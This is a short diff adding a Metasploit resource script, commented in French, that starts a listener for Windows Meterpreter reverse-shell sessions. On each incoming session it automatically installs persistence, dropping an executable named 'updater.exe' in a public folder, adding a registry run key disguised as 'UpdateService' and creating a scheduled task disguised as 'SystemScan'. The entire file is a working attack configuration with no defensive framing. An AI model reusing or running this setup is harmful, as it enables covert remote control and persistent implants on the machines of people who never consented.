@@ -1,0 +1,8 @@
+## Adapter chemin / ip local ##
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.23 
+set LPORT 4427
+set ExitOnSession false
+set AutoRunScript "post/windows/manage/persistence_exe REXEPATH=/home/joe/payloads/updater.exe STARTUP=USER REG_NAME=UpdateService DESTINATION=C:\\Users\\Public\\; post/windows/manage/scheduled_task SCHTASK_NAME=SystemScan SCHTASK_CMD=C:\\Users\\Public\\updater.exe"
+exploit -j  
